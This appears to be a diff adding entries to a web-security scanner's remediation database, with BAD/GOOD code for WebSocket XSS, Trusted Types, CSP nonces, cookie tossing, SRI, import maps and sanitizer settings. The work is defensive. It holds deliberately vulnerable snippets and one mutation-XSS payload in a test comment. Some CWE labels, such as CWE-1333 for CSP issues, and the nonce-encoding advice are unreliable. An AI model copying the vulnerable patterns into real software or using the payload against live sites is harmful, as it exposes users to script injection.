+      "detail": "WebSocket XSS happens because the client treats incoming WebSocket messages as trusted.  Three exploitation vectors exist: (1) a compromised or MITM'd WebSocket server pushes a payload; (2) a Cross-Site WebSocket Hijacking (CSWSH) attack opens a socket using the victim's cookies; (3) the WebSocket server itself is a third-party service that becomes compromised.  The fix is to (a) validate the WebSocket server's identity, (b) validate the shape of every incoming message against a schema, and (c) NEVER pass event.data to innerHTML / eval / dangerouslySetInnerHTML.",
+      "code_example": "// BAD: WebSocket handler that fires XSS\nws.onmessage = function(e) {\n  document.getElementById('out').innerHTML = e.data;\n};\n\n// GOOD: validate message shape + use textContent\nws.onmessage = function(e) {\n  let msg;\n  try { msg = JSON.parse(e.data); } catch (_) { return; }\n  if (typeof msg.text !== 'string') return;  // schema check\n  document.getElementById('out').textContent = msg.text;  // safe sink\n};\n\n// Server-side: validate the Origin header on the WebSocket handshake\n# Node.js (ws library)\nimport { WebSocketServer } from 'ws';\nconst wss = new WebSocketServer({ port: 8080 });\nwss.on('connection', (ws, req) => {\n  const origin = req.headers.origin;\n  if (origin !== 'https://yourapp.example.com') {\n    ws.close(1008, 'origin not allowed');\n    return;\n  }\n  // ... attach handlers ...\n});\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Always use wss:// (TLS) -- never ws:// (cleartext).",
+        "Validate the Origin header on the WebSocket handshake to prevent CSWSH.",
+        "Apply a strict Content-Security-Policy with connect-src restrictions.",
+        "Use a JSON schema validator (e.g. ajv) on every incoming message."
+      ]
+    },
+    "websocket_insecure": {
+      "headline": "Use wss:// (TLS) for all WebSocket connections; never use ws://.",
+      "detail": "An unencrypted ws:// WebSocket can be intercepted by any network-level attacker (coffee shop Wi-Fi, ISP, corporate proxy).  The attacker can read all messages and -- if the client has an unsafe onmessage sink -- inject XSS payloads.  Always use wss://, which encrypts the entire channel.",
+      "code_example": "// BAD: unencrypted WebSocket\nvar ws = new WebSocket('ws://chat.example.com/socket');\n\n// GOOD: encrypted WebSocket\nvar ws = new WebSocket('wss://chat.example.com/socket');\n\n# Server-side: redirect ws:// to wss:// and set HSTS\n# Nginx\nserver {\n  listen 80;\n  server_name chat.example.com;\n  return 301 https://$server_name$request_uri;\n}\n",
+      "primary_cwe": "CWE-319",
+      "also_consider": [
+        "Set HSTS (Strict-Transport-Security) to force TLS for all connections.",
+        "Validate the Origin header on the WebSocket handshake.",
+        "Apply CSP connect-src 'self' wss: to block ws:// from the start."
+      ]
+    },
+    "trusted_types_taint_flow": {
+      "headline": "Wrap user-controlled data in a Trusted Types policy before passing to a DOM sink.",
+      "detail": "User-controlled data (location.hash, event.data, document.referrer, ...) is flowing into a dangerous DOM sink (innerHTML, document.write, eval, ...) without passing through a Trusted Types policy.  This is a live DOM-XSS primitive: an attacker who controls the source can deliver a payload that executes in the page.  The fix is to (1) replace the sink with a safe alternative (textContent for HTML, JSON.parse + property assignment for data), or (2) wrap the data in a TT policy that sanitizes it (e.g. via DOMPurify) before assignment.",
+      "code_example": "// BAD: location.hash flows into innerHTML unescaped\ndocument.getElementById('out').innerHTML = location.hash.slice(1);\n\n// GOOD (option 1): use textContent (no HTML parsing)\ndocument.getElementById('out').textContent = location.hash.slice(1);\n\n// GOOD (option 2): TT policy + DOMPurify\nconst sanitizer = trustedTypes.createPolicy('sanitizer', {\n  createHTML: (input) => DOMPurify.sanitize(input),\n});\ndocument.getElementById('out').innerHTML =\n  sanitizer.createHTML(location.hash.slice(1));\n\n// Also enforce TT in CSP so the bad pattern throws:\n// Content-Security-Policy: require-trusted-types-for 'script';\n//                         trusted-types sanitizer;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable require-trusted-types-for 'script' in CSP to block all raw-string DOM sink assignments at the browser level.",
+        "Migrate sinks to textContent / setText / setHTML where available.",
+        "Audit every location.hash / location.search / event.data read -- each is a DOM-XSS source."
+      ]
+    },
+    "trusted_types_policy_bypass": {
+      "headline": "Replace identity TT policies with a real sanitizer (DOMPurify).",
+      "detail": "A Trusted Types policy is registered but its createHTML (or createScript) is an identity function (input => input) or the policy object is empty.  This is a common migration anti-pattern: developers add TT to satisfy a CSP requirement, but the policy does nothing, so the DOM-XSS surface is unchanged.  An attacker who reaches the sink still wins.  The fix is to make createHTML actually sanitize the input -- use DOMPurify or a tag-allowlist approach.",
+      "code_example": "// BAD: identity policy (TT is a no-op)\nconst policy = trustedTypes.createPolicy('noop', {\n  createHTML: (input) => input,  // no sanitization!\n});\nel.innerHTML = policy.createHTML(userInput);  // still XSS\n\n// GOOD: policy that sanitizes via DOMPurify\nconst policy = trustedTypes.createPolicy('safe', {\n  createHTML: (input) => DOMPurify.sanitize(input, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n    ALLOWED_ATTR: ['href'],\n  }),\n});\nel.innerHTML = policy.createHTML(userInput);\n\n// GOOD: empty policy is also a bypass -- don't register one\n// if you don't need it.  Instead, use textContent.\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Run the CSP Evaluator (csp-evaluator.withgoogle.com) to verify the policy is correctly enforced.",
+        "Audit every createPolicy call -- each identity/empty policy is a defense-in-depth hole.",
+        "Prefer a single shared sanitizer policy rather than per-feature policies (easier to audit)."
+      ]
+    },
+    "trusted_types_no_policy": {
+      "headline": "Register a Trusted Types policy and enforce it via CSP.",
+      "detail": "The page uses dangerous DOM sinks (innerHTML, document.write, eval, ...) but no Trusted Types policy is registered.  Trusted Types is the only reliable DOM-XSS mitigation: it forces every HTML-writing sink to receive a typed TrustedHTML object, which can only be produced by a registered policy that sanitizes the input.  Without TT, any sink that receives user-controlled data is a live DOM-XSS primitive.",
+      "code_example": "// Step 1: register a sanitizer policy\nconst sanitizer = trustedTypes.createPolicy('sanitizer', {\n  createHTML: (input) => DOMPurify.sanitize(input),\n});\n\n// Step 2: wrap every sink call\nel.innerHTML = sanitizer.createHTML(userInput);\n\n// Step 3: enforce TT via CSP (this makes raw-string sink\n//         assignments throw at runtime)\n// Content-Security-Policy:\n//   require-trusted-types-for 'script';\n//   trusted-types sanitizer;\n//   script-src 'nonce-{RANDOM}' 'strict-dynamic';\n",
+      "primary_cwe": "CWE-1333",
+      "also_consider": [
+        "Even with TT enforced, audit sink calls for taint flows -- a policy that returns input unchanged is a bypass.",
+        "Deploy TT gradually: use 'Content-Security-Policy-Report-Only' first to collect violations without breaking the page.",
+        "Combine TT with a strict nonce-based CSP for defense-in-depth."
+      ]
+    },
+    "trusted_types_policy_unused": {
+      "headline": "Wire the registered TT policy into every sink call.",
+      "detail": "A Trusted Types policy is registered but never called via policy.createHTML(...).  This means the sinks on the page still receive raw strings -- the policy is dead code.  This often happens when TT is added for compliance but the sinks are not refactored.  The fix is to wrap every sink call with the policy.",
+      "code_example": "// BAD: policy registered but never used\nconst sanitizer = trustedTypes.createPolicy('sanitizer', {\n  createHTML: (input) => DOMPurify.sanitize(input),\n});\n// ... later ...\nel.innerHTML = userInput;  // raw string -- TT not applied\n\n// GOOD: wrap the sink call\nel.innerHTML = sanitizer.createHTML(userInput);\n",
+      "primary_cwe": "CWE-1333",
+      "also_consider": [
+        "Add require-trusted-types-for 'script' to CSP so raw-string sink assignments throw (catches the dead-code pattern at runtime).",
+        "Run a CI lint pass for innerHTML/eval calls that aren't wrapped in a policy.createHTML call."
+      ]
+    },
+    "trusted_types_violation": {
+      "headline": "Fix the Trusted Types violation per the specific sub-type.",
+      "detail": "A Trusted Types violation was detected.  The specific sub-type (taint flow, policy bypass, no policy, or unused policy) is recorded in the finding's tt_violation_type field.  See the remediation advice for that sub-type for the specific fix.",
+      "code_example": "// General TT remediation:\nconst sanitizer = trustedTypes.createPolicy('sanitizer', {\n  createHTML: (input) => DOMPurify.sanitize(input),\n});\nel.innerHTML = sanitizer.createHTML(userInput);\n\n// CSP enforcement:\n// require-trusted-types-for 'script';\n// trusted-types sanitizer;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Replace innerHTML with textContent where no HTML rendering is needed.",
+        "Deploy DOMPurify as the sanitizer in every TT policy."
+      ]
+    },
+    "csp_nonce_too_short": {
+      "headline": "Use a CSP nonce of at least 16 random bytes (128 bits, base64-encoded).",
+      "detail": "The CSP nonce is too short (< 16 chars).  A short nonce is brute-forceable: an attacker who can send many requests (or observe many responses) can enumerate the nonce space and inject <script nonce=KNOWN> to bypass CSP.  The fix is to generate the nonce from a cryptographically secure random source (crypto.randomBytes in Node, secrets.token_urlsafe in Python) with at least 128 bits of entropy.",
+      "code_example": "# Node.js (Express)\nconst crypto = require('crypto');\nconst nonce = crypto.randomBytes(16).toString('base64');\n  // 22 chars, 128 bits of entropy\nres.setHeader('Content-Security-Policy',\n  `script-src 'nonce-${nonce}' 'strict-dynamic';` +\n  `object-src 'none'; base-uri 'self'`);\n\n# Python (Flask)\nimport secrets\nnonce = secrets.token_urlsafe(16)  # ~22 chars, 128 bits\nresp.headers['Content-Security-Policy'] = (\n    f\"script-src 'nonce-{nonce}' 'strict-dynamic'; \"\n    f\"object-src 'none'; base-uri 'self'\"\n)\n",
+      "primary_cwe": "CWE-1333",
+      "also_consider": [
+        "Combine nonce with 'strict-dynamic' so whitelisted CDNs no longer matter (script gadgets can't bypass).",
+        "Generate a fresh nonce per request -- never cache the nonce.",
+        "Avoid base64url for nonces (use base64 to maximize entropy per character)."
+      ]
+    },
+    "csp_nonce_predictable": {
+      "headline": "Generate CSP nonces from a CSPRNG; never use counters or timestamps.",
+      "detail": "The CSP nonce looks sequential (all digits, low entropy).  A predictable nonce completely defeats CSP: an attacker who can guess the next nonce can inject <script nonce=GUESSED> on any request.  The fix is to generate the nonce from a cryptographically secure pseudo-random number generator (CSPRNG) -- never from a counter, timestamp, or Math.random().",
+      "code_example": "# BAD: sequential / predictable nonce\nnonce = str(request_counter)         # 1, 2, 3, ...\nnonce = str(int(time.time()))        # seconds since epoch\nnonce = str(uuid.uuid4().int)[:8]    # truncated UUID\n\n# GOOD: CSPRNG\nimport secrets\nnonce = secrets.token_urlsafe(16)    # 128 bits, URL-safe base64\n\n# Node.js\nconst crypto = require('crypto');\nconst nonce = crypto.randomBytes(16).toString('base64');\n",
+      "primary_cwe": "CWE-1333",
+      "also_consider": [
+        "Rotate the nonce per request -- a predictable per-request nonce is still exploitable if it can be guessed before the victim's request is processed.",
+        "Audit every code path that generates a nonce -- a single weak generator undoes the entire CSP."
+      ]
+    },
+    "csp_nonce_misconfigured": {
+      "headline": "Ensure every <script> tag carries the nonce attribute.",
+      "detail": "The CSP declares a nonce, but no <script nonce=...> tag appears in the HTML.  This means the page's inline scripts will be BLOCKED by CSP (the page is broken) -- or the nonce is being applied via a non-standard mechanism (e.g. a meta tag, which CSP Level 2 does not support for nonces).  The fix is to (1) add the nonce to every inline <script> tag, and (2) ensure the nonce is generated server-side and injected into the template.",
+      "code_example": "# Server-side (Python / Jinja2)\nimport secrets\nnonce = secrets.token_urlsafe(16)\nresp.headers['Content-Security-Policy'] = (\n    f\"script-src 'nonce-{nonce}' 'strict-dynamic'; \"\n    f\"object-src 'none'\"\n)\n# In the template:\n<script nonce=\"{{ nonce }}\">\n  // inline script runs because it carries the nonce\n  console.log('hello');\n</script>\n",
+      "primary_cwe": "CWE-1333",
+      "also_consider": [
+        "Use 'strict-dynamic' so external scripts loaded by a nonce'd script also run (no need to whitelist every CDN).",
+        "Run the page through CSP Evaluator to verify the nonce is applied correctly."
+      ]
+    },
+    "csp_nonce_multi": {
+      "headline": "Use a single nonce per response; investigate multiple nonces.",
+      "detail": "The CSP declares multiple different nonces in a single response.  This is unusual -- normally a single nonce is generated per request and applied to every <script> tag.  Multiple nonces usually indicate a config bug (e.g. two middleware layers each adding their own nonce) or a mid-migration state.  While not directly exploitable, it increases the nonce surface area and complicates auditing.",
+      "code_example": "# BAD: two middleware layers each adding a nonce\n# (results in 'nonce-AAA' 'nonce-BBB' in CSP)\n@app.after_request\ndef add_csp_1(resp):\n    resp.headers['Content-Security-Policy'] = (\n        f\"script-src 'nonce-{secrets.token_urlsafe(16)}'\"\n    )\n    return resp\n\n@app.after_request\ndef add_csp_2(resp):\n    # This APPENDS a second nonce to the existing header!\n    existing = resp.headers.get('Content-Security-Policy', '')\n    resp.headers['Content-Security-Policy'] = (\n        existing + f\" 'nonce-{secrets.token_urlsafe(16)}'\"\n    )\n    return resp\n\n# GOOD: single CSP middleware, single nonce\n@app.after_request\ndef add_csp(resp):\n    nonce = secrets.token_urlsafe(16)\n    resp.headers['Content-Security-Policy'] = (\n        f\"script-src 'nonce-{nonce}' 'strict-dynamic'; \"\n        f\"object-src 'none'\"\n    )\n    g.nonce = nonce  # make available to template\n    return resp\n",
+      "primary_cwe": "CWE-1333",
+      "also_consider": [
+        "Audit every middleware that touches Content-Security-Policy -- only one should set the nonce.",
+        "Log the nonce per request for auditing (not for security)."
+      ]
+    },
+    "cookie_tossing_set_cookie": {
+      "headline": "Scope cookies to the response host; avoid parent-domain Domain attributes.",
+      "detail": "A Set-Cookie header sets a Domain= attribute that is a parent of the response host.  This means the cookie will be delivered to ALL subdomains of that parent, enabling cookie-tossing XSS: an attacker who controls any subdomain can set a malicious cookie value that will be delivered to sibling subdomains.  If any sibling reflects cookie values into HTML without sanitization, the attacker achieves XSS on that sibling origin.  The fix is to omit the Domain= attribute entirely (which scopes the cookie to the exact response host) or to set Domain= to the response host itself (self-scope).",
+      "code_example": "# BAD: parent-domain cookie enables tossing\nfrom flask import make_response\n@app.route('/login')\ndef login():\n    resp = make_response('logged in')\n    resp.set_cookie('session', token, domain='.example.com')\n    return resp\n\n# GOOD: host-scoped cookie (no Domain attribute)\n@app.route('/login')\ndef login():\n    resp = make_response('logged in')\n    resp.set_cookie('session', token, httponly=True, secure=True,\n                    samesite='Lax')\n    return resp\n",
+      "primary_cwe": "CWE-1004",
+      "also_consider": [
+        "Audit every subdomain that reflects cookie values -- even if you fix this Set-Cookie, existing cookies with parent scope may still be present.",
+        "Use HttpOnly + Secure + SameSite=Lax on all session cookies.",
+        "Consider a __Host- prefixed cookie name to enforce host-scoping."
+      ]
+    },
+    "cookie_tossing_client": {
+      "headline": "Remove the Domain= attribute from client-side document.cookie assignments.",
+      "detail": "The page contains a client-side `document.cookie = \"...; domain=...\"` assignment that sets a parent-domain cookie.  An attacker who can inject JS (e.g. via any XSS on the page) can replicate this pattern to toss a malicious cookie to sibling origins.  Remove the explicit `domain=` attribute so the cookie is scoped to the current host only.",
+      "code_example": "// BAD: parent-domain cookie via document.cookie\ndocument.cookie = 'pref=' + value + '; domain=.example.com; path=/';\n\n// GOOD: host-scoped cookie (omit domain=)\ndocument.cookie = 'pref=' + encodeURIComponent(value) + '; path=/';\n",
+      "primary_cwe": "CWE-1004",
+      "also_consider": [
+        "Validate any value assigned to document.cookie -- an attacker may inject `; domain=` via the value.",
+        "Prefer the Cookie Store API (cookieStore.set()) which makes the domain scope explicit and reject broad scopes in code review."
+      ]
+    },
+    "cookie_sink_flow": {
+      "headline": "Never pass document.cookie values to DOM sinks without sanitization.",
+      "detail": "The page reads a cookie value (via document.cookie, getCookie(), or cookies.get()) and passes it into a dangerous DOM sink (innerHTML, eval, document.write, etc.) without sanitization.  If an attacker can set the cookie -- either via a subdomain (cookie tossing) or via a same-origin XSS -- the sink will execute the injected payload.  Use textContent instead of innerHTML, or sanitize the cookie value with DOMPurify before passing it to any sink.",
+      "code_example": "// BAD: cookie value -> innerHTML (cookie-tossing XSS)\nvar theme = getCookie('theme');\ndocument.getElementById('out').innerHTML = theme;\n\n// GOOD: use textContent (no HTML parsing)\nvar theme = getCookie('theme');\ndocument.getElementById('out').textContent = theme;\n\n// ACCEPTABLE: sanitize with DOMPurify if HTML is required\nvar theme = getCookie('theme');\ndocument.getElementById('out').innerHTML = DOMPurify.sanitize(theme);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Enable Trusted Types (CSP: require-trusted-types-for 'script') to block raw string assignment to innerHTML at the browser level.",
+        "Audit every cookie read site-wide -- any cookie that reaches a sink is a tossing-XSS candidate."
+      ]
+    },
+    "sri_missing_script": {
+      "headline": "Add an integrity= attribute to every cross-origin <script>.",
+      "detail": "The page loads a cross-origin <script> without an integrity= attribute.  If the CDN is compromised (or a MITM modifies the response on http:// origins), arbitrary JavaScript will execute in the page's origin -- yielding full XSS.  Subresource Integrity (SRI) lets the browser verify the script's hash before executing it, blocking any modified resource.  Generate the integrity hash with `openssl dgst -sha384 -binary lib.js | openssl base64 -A` and add `integrity=\"sha384-<hash>\" crossorigin=\"anonymous\"` to the <script> tag.",
+      "code_example": "<!-- BAD: no SRI, CDN compromise = XSS -->\n<script src=\"https://cdn.example.com/lib.js\"></script>\n\n<!-- GOOD: SRI + crossorigin -->\n<script src=\"https://cdn.example.com/lib.js\"\n        integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n        crossorigin=\"anonymous\"></script>\n",
+      "primary_cwe": "CWE-353",
+      "also_consider": [
+        "Pin the CDN URL to a specific version (e.g. lib@1.2.3) so the integrity hash is stable across deploys.",
+        "Self-host critical scripts if CDN reliability is a concern.",
+        "Add a CSP `script-src` directive as defense-in-depth."
+      ]
+    },
+    "sri_missing_script_summary": {
+      "headline": "Add integrity= to all cross-origin scripts (multiple found).",
+      "detail": "Multiple cross-origin <script> tags on this page lack SRI.  Each one is an independent CDN-compromise XSS vector.  See the individual findings for the specific resource URLs.",
+      "code_example": "# Generate SRI hashes in bulk:\nfor f in lib.js lib2.js lib3.js; do\n  echo -n \"$f: \"\n  curl -s https://cdn.example.com/$f | openssl dgst -sha384 -binary | openssl base64 -A\n  echo\ndone\n",
+      "primary_cwe": "CWE-353",
+      "also_consider": [
+        "Automate SRI generation in your build pipeline so it cannot be forgotten during deploys."
+      ]
+    },
+    "sri_missing_style": {
+      "headline": "Add integrity= to cross-origin <link rel=stylesheet>.",
+      "detail": "The page loads a cross-origin stylesheet (or script preload) without an integrity= attribute.  A compromised CDN can inject arbitrary CSS, which can be leveraged for data exfiltration (via CSS attribute selectors + background-image beacons) and, on legacy browsers, script execution via -moz-binding or behavior.  Add an integrity= attribute with the SHA-384 hash of the resource.",
+      "code_example": "<!-- BAD: no SRI on stylesheet -->\n<link rel=\"stylesheet\" href=\"https://cdn.example.com/styles.css\">\n\n<!-- GOOD: SRI + crossorigin -->\n<link rel=\"stylesheet\" href=\"https://cdn.example.com/styles.css\"\n      integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n      crossorigin=\"anonymous\">\n",
+      "primary_cwe": "CWE-353",
+      "also_consider": [
+        "Also add integrity= to <link rel=\"preload\" as=\"script\">.",
+        "Consider self-hosting stylesheets if the CDN is untrusted."
+      ]
+    },
+    "sri_broken_no_crossorigin": {
+      "headline": "Add crossorigin=\"anonymous\" when using integrity=.",
+      "detail": "The page has a <script> with an integrity= attribute but no crossorigin attribute.  Without crossorigin, the browser treats the response as opaque and cannot read the body to compute the hash -- so SRI is silently disabled.  Always pair integrity= with crossorigin=\"anonymous\".",
+      "code_example": "<!-- BAD: integrity= but no crossorigin (SRI silently disabled) -->\n<script src=\"https://cdn.example.com/lib.js\"\n        integrity=\"sha384-...\"></script>\n\n<!-- GOOD: integrity= + crossorigin -->\n<script src=\"https://cdn.example.com/lib.js\"\n        integrity=\"sha384-...\"\n        crossorigin=\"anonymous\"></script>\n",
+      "primary_cwe": "CWE-345",
+      "also_consider": [
+        "Ensure the CDN sends Access-Control-Allow-Origin: * (or your origin) so the crossorigin request succeeds."
+      ]
+    },
+    "sri_malformed": {
+      "headline": "Fix the malformed integrity= attribute.",
+      "detail": "The page has a <script> with an integrity= attribute that is empty or malformed (e.g. integrity=\"\", integrity=\"sha256-\", or an unsupported algorithm like sha1).  Browsers treat a malformed integrity as no SRI protection.  Regenerate the hash using sha256, sha384, or sha512.",
+      "code_example": "# Generate a valid SRI hash:\nopenssl dgst -sha384 -binary lib.js | openssl base64 -A\n# Output: oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\n# Use: integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n",
+      "primary_cwe": "CWE-345",
+      "also_consider": [
+        "Add a CI check that validates integrity= format on every deploy."
+      ]
+    },
+    "sri_insecure_origin": {
+      "headline": "Load scripts over https://, not http://.",
+      "detail": "The page loads a script (or stylesheet) from an http:// origin.  Even with SRI, an active network attacker can substitute the response because the attacker controls both the network and (if the page itself is http://) the page.  SRI over http:// protects against CDN compromise but NOT against MITM.  Switch to https:// for all external resources.",
+      "code_example": "<!-- BAD: http:// origin (MITM can substitute despite SRI) -->\n<script src=\"http://cdn.example.com/lib.js\"\n        integrity=\"sha384-...\"\n        crossorigin=\"anonymous\"></script>\n\n<!-- GOOD: https:// origin -->\n<script src=\"https://cdn.example.com/lib.js\"\n        integrity=\"sha384-...\"\n        crossorigin=\"anonymous\"></script>\n",
+      "primary_cwe": "CWE-319",
+      "also_consider": [
+        "Add a CSP `upgrade-insecure-requests` directive to automatically rewrite http:// to https://.",
+        "Audit all external resource URLs -- mixed content is a common regression."
+      ]
+    },
+    "import_map_user_controlled": {
+      "headline": "Never place user-controlled input inside an import map JSON.",
+      "detail": "The page's <script type=\"importmap\"> content reflects user input (e.g. a query parameter).  An attacker can inject a malicious module specifier that hijacks bare imports like `import \"react\"` to point at an attacker-controlled script, yielding full XSS in the page's origin.  Import maps MUST be static server-side configuration -- never derive any portion from request data.",
+      "code_example": "<!-- BAD: import map reflects query param -->\n<script type=\"importmap\">\n{\"imports\": {\"react\": \"https://cdn/<%= request.q %>\"}}\n</script>\n\n<!-- GOOD: static import map -->\n<script type=\"importmap\">\n{\"imports\": {\"react\": \"https://cdn/react@18.2.0/dev.js\"}}\n</script>\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Pin every module specifier to a specific version + SRI hash.",
+        "Add CSP `script-src` restrictions as defense-in-depth."
+      ]
+    },
+    "import_map_cross_origin": {
+      "headline": "Add integrity= to cross-origin import map entries.",
+      "detail": "An import map entry points to a cross-origin URL without integrity protection.  If the CDN is compromised or a MITM modifies the response, the imported module becomes an XSS vector.  Use HTTPS URLs pinned to specific versions and add SRI hashes (the import map spec does not yet support integrity= natively -- self-host critical modules or wrap imports with a CSP allowlist).",
+      "code_example": "<!-- GOOD: pin to a version + strict CSP -->\n<script type=\"importmap\">\n{\"imports\": {\"react\": \"https://cdn/react@18.2.0/dev.js\"}}\n</script>\n<meta http-equiv=\"Content-Security-Policy\"\n      content=\"script-src 'self' https://cdn\">\n",
+      "primary_cwe": "CWE-353",
+      "also_consider": [
+        "Self-host critical modules when CDN reliability matters.",
+        "Audit import maps on every deploy -- new entries are common XSS regressions."
+      ]
+    },
+    "import_map_insecure_origin": {
+      "headline": "Serve all import map entries over HTTPS.",
+      "detail": "An import map entry uses an http:// URL.  Active network attackers can MITM the module response and inject malicious JavaScript that executes in the page's origin.  Switch every entry to https:// and add HSTS to the host.",
+      "code_example": "<!-- BAD -->\n{\"imports\": {\"utils\": \"http://insecure/utils.js\"}}\n\n<!-- GOOD -->\n{\"imports\": {\"utils\": \"https://secure/utils.js\"}}\n",
+      "primary_cwe": "CWE-319",
+      "also_consider": [
+        "Add HSTS to the module host so browsers refuse http:// upgrades."
+      ]
+    },
+    "import_map_after_module": {
+      "headline": "Place <script type=\"importmap\"> before any module script.",
+      "detail": "Per the HTML spec, an import map that appears after a <script type=\"module\"> is ignored -- but some browsers exhibit undefined behavior or partial application, which can be abused to load unexpected modules.  Always put the import map as the first <script> in <head>.",
+      "code_example": "<head>\n  <script type=\"importmap\">{...}</script>\n  <script type=\"module\">import \"react\";</script>\n</head>\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Lint import map ordering in CI to catch regressions."
+      ]
+    },
+    "import_map_multiple": {
+      "headline": "Use a single <script type=\"importmap\"> per document.",
+      "detail": "Multiple import map scripts cause merge behavior that varies across browsers; only the first is officially supported and later maps may silently override specifiers.  Consolidate all entries into one map to avoid ambiguous module resolution.",
+      "code_example": "<!-- GOOD: one combined map -->\n<script type=\"importmap\">\n{\"imports\": {\"react\": \"...\", \"lodash\": \"...\"}}\n</script>\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Move import map generation into the build step."
+      ]
+    },
+    "import_map_invalid_json": {
+      "headline": "Validate import map JSON at build time.",
+      "detail": "The import map contains invalid JSON.  Browsers will reject the entire map, which can break module resolution and leave bare imports pointing at unexpected fallbacks.  Validate the JSON in CI and never build the map by string concatenation.",
+      "code_example": "// Build step: JSON.stringify guarantees valid JSON\nconst importMap = { imports: { react: reactUrl } };\nconst tag = `<script type=\"importmap\">${JSON.stringify(importMap)}</script>`;\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Add a JSON schema check for import maps in CI."
+      ]
+    },
+    "sanitizer_vulnerable_version": {
+      "headline": "Upgrade the HTML sanitizer to a non-vulnerable version.",
+      "detail": "The page loads a sanitizer library (DOMPurify, sanitize-html, etc.) with a known-vulnerable version.  Published CVEs allow attackers to craft mutation XSS payloads that bypass sanitization, which then execute when the sanitized string is assigned to innerHTML.  Upgrade to the latest patched release and pin the version so it cannot drift.",
+      "code_example": "<!-- BAD: vulnerable 1.0.7 -->\n<script src=\"https://cdn/dompurify@1.0.7/purify.min.js\"></script>\n\n<!-- GOOD: pinned patched version -->\n<script src=\"https://cdn/dompurify@3.0.6/purify.min.js\"\n        integrity=\"sha384-<hash>\" crossorigin=\"anonymous\"></script>\n",
+      "primary_cwe": "CWE-1104",
+      "also_consider": [
+        "Subscribe to security advisories for the sanitizer library.",
+        "Add Dependabot/Renovate to auto-bump sanitizer versions."
+      ]
+    },
+    "sanitizer_config_add_script": {
+      "headline": "Never allow <script> in sanitizer ADD_TAGS/ALLOWED_TAGS.",
+      "detail": "The sanitizer is configured with ADD_TAGS or ALLOWED_TAGS that includes 'script'.  This effectively disables XSS protection -- any user input passed through sanitize() can carry an inline <script> that executes when assigned to innerHTML.  Remove 'script' from the allowlist and rely on the default safe tag set.",
+      "code_example": "// BAD\nDOMPurify.sanitize(html, {ADD_TAGS: ['script']});\n\n// GOOD -- default safe set\nDOMPurify.sanitize(html);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Audit every sanitizer config override -- most are unsafe."
+      ]
+    },
+    "sanitizer_config_allow_script": {
+      "headline": "Remove ALLOW_SCRIPT or set it to false in the sanitizer config.",
+      "detail": "The sanitizer is configured with ALLOW_SCRIPT or a similar flag that permits <script> elements in the output.  This defeats the purpose of sanitization.  Set it to false (or remove the flag entirely) so the default no-script behavior applies.",
+      "code_example": "// BAD\nsanitizeHtml(html, {allowedTags: sanitizeHtml.defaults.allowedTags.concat(['script'])});\n\n// GOOD\nsanitizeHtml(html);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Use the sanitizer's defaults unless you audit each override."
+      ]
+    },
+    "sanitizer_config_add_iframe": {
+      "headline": "Do not allow <iframe> in sanitizer output.",
+      "detail": "Allowing <iframe> in sanitized output permits attackers to embed arbitrary framed pages, which can be combined with frame navigation or clickjacking to achieve XSS or content spoofing.  Remove 'iframe' from ADD_TAGS/ALLOWED_TAGS.",
+      "code_example": "// BAD\nDOMPurify.sanitize(html, {ADD_TAGS: ['iframe']});\n\n// GOOD\nDOMPurify.sanitize(html);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Block iframes via CSP `frame-src 'none'` as defense-in-depth."
+      ]
+    },
+    "sanitizer_config_return_dom": {
+      "headline": "Use RETURN_DOM_FRAGMENT instead of RETURN_DOM.",
+      "detail": "Configuring the sanitizer with RETURN_DOM returns a live DOM node; if that node contains event handlers or attributes introduced by mutation, they execute when appended.  Prefer RETURN_DOM_FRAGMENT (a detached fragment) or RETURN_DOM_TYPE = 'DocumentFragment' to avoid live-node side effects.",
+      "code_example": "// BAD\nDOMPurify.sanitize(html, {RETURN_DOM: true});\n\n// GOOD\nconst frag = DOMPurify.sanitize(html, {RETURN_DOM_FRAGMENT: true});\ncontainer.appendChild(frag);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Test sanitized output with mXSS payloads before deploy."
+      ]
+    },
+    "sanitizer_config_return_dom_fragment": {
+      "headline": "Validate RETURN_DOM_FRAGMENT usage with mXSS tests.",
+      "detail": "RETURN_DOM_FRAGMENT is safer than RETURN_DOM but still returns parsed nodes that can carry mutation-based XSS if the sanitizer version is outdated.  Ensure the sanitizer is on the latest version and add regression tests with known mXSS payloads.",
+      "code_example": "const frag = DOMPurify.sanitize(html, {RETURN_DOM_FRAGMENT: true});\n// Add a regression test:\n// assert(DOMPurify.sanitize('<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>').includes('onerror') === false);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
+        "Run the mXSS test suite from the sanitizer's repo in CI."
+      ]
+    },
+    "sanitizer_config_allow_unknown_protocols": {
+      "headline": "Disable ALLOW_UNKNOWN_PROTOCOLS in the sanitizer.",
+      "detail": "Allowing unknown protocols lets attackers inject javascript:, data: or vbscript: URLs in href/src attributes.  These execute when the user clicks the link or the resource loads.  Keep the default protocol allowlist (http, https, mailto, etc.).",
+      "code_example": "// BAD\nDOMPurify.sanitize(html, {ALLOW_UNKNOWN_PROTOCOLS: true});\n\n// GOOD\nDOMPurify.sanitize(html);\n",
+      "primary_cwe": "CWE-79",
+      "also_consider": [
